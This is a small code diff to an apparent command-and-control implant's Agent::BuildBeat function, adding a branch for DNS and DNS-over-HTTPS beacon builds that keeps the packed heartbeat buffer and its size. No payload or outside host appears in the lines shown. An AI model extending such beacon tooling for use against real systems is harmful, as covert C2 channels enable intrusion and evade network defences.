@@ -147,6 +147,11 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	PBYTE pdata = packer->data();
 	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
 
+#elif defined(BEACON_DNS) || defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
+
+	ULONG beat_size = packer->datasize();
+	PBYTE beat      = packer->data();
+
 #endif
 
 	delete packer;
